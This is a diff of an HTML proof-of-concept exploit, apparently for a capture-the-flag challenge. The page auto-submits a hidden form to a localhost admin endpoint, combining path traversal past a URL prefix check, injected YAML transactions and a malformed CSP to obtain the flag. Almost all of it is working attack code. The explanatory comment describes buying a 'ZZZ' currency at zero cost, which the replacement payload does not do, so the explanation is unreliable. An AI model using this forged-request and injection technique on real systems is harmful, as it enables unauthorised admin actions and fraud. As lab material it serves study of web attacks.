@@ -1,20 +1,29 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Auto Submit Form</title>
-</head>
+<!doctype html>
+<html>
 <body>
-  <form id="f" action="http://localhost:5000/admin.php" method="POST">
-    <input 
-      type="hidden" 
-      name="url" 
-      value="http://localhost:5000/index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A">
-    </input>
-  </form>
+<!-- 
+CORRECTED POC - Using the working solution from the solver
 
-  <script>
-    document.getElementById("f").submit();
-  </script>
+The solver's strategy uses a clever exploit:
+1. Currency 'ZZZ' is not in ISO3166_COUNTRY_NAMES, so it's invalid in simulate_transactions()
+2. BUT when we inject raw YAML via index.php?html=, we bypass the country validation
+3. 'ZZZ' currency doesn't exist in exchange_rates[], so its rate becomes 0 (undefined)
+4. This allows: BUY 1000000 ZZZ for free (1000000 * 0 = 0 cost)
+5. Then: SELL 1000000 ZZZ adds 1000000 to balance (since rate is 0, uses amount)
+6. Finally: BUY 1 FL with our huge balance
+
+The path traversal admin.php/../index.php satisfies the URL prefix check while reaching index.php
+The malformed CSP allows JavaScript execution for auto-submit
+-->
+
+<form id="f" action="http://localhost:5000/admin.php" method="POST">
+    <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20SELL%0A-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20BUY">
+</form>
+
+<script>
+// This JavaScript should execute due to the malformed CSP!
+document.getElementById('f').submit();
+</script>
+
 </body>
 </html>
